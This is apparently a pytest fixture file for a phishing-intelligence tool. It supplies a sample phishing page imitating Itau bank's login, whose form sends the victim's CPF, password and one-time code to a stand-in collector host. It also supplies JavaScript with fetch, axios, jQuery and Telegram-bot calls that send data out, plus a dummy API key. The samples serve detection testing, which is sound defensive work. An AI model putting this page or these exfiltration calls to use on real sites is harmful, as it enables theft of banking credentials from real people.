"""Pytest fixtures for phishing_intel tests."""

from __future__ import annotations

import pytest


@pytest.fixture
def phishing_html() -> str:
    """Return a realistic partner-supplied phishing HTML fixture."""

    return """
    <html>
      <head>
        <meta name="description" content="Itau verificacao de conta bloqueada">
        <!-- kit: br-login-v3 -->
        <link href="/assets/itau/login.css" rel="stylesheet">
        <script src="/assets/itau/app.js"></script>
      </head>
      <body>
        <img src="/assets/itau/logo.png" alt="Itau">
        <form id="loginForm" class="capture form" method="post" action="https://collector.example/api/submit">
          <label for="cpf">CPF</label>
          <input id="cpf" name="cpf" placeholder="Digite seu CPF">
          <label for="senha">Senha</label>
          <input id="senha" name="senha" type="password" placeholder="Senha do internet banking">
          <input name="session_id" type="hidden" value="abc">
          <input name="otp" placeholder="Codigo token">
        </form>
        <a href="https://itau.example/security">seguranca</a>
      </body>
    </html>
    """


@pytest.fixture
def phishing_js() -> str:
    """Return JavaScript with exfiltration APIs and exposed token signals."""

    return """
    const api_key = "abcdef1234567890";
    fetch("https://collector.example/api/submit", {method: "POST"});
    axios.post("https://api.telegram.org/bot123/sendMessage", payload);
    $.ajax({url: "https://collector.example/webhook.json", method: "POST"});
    const backup = "https://backup.example/drop";
    """
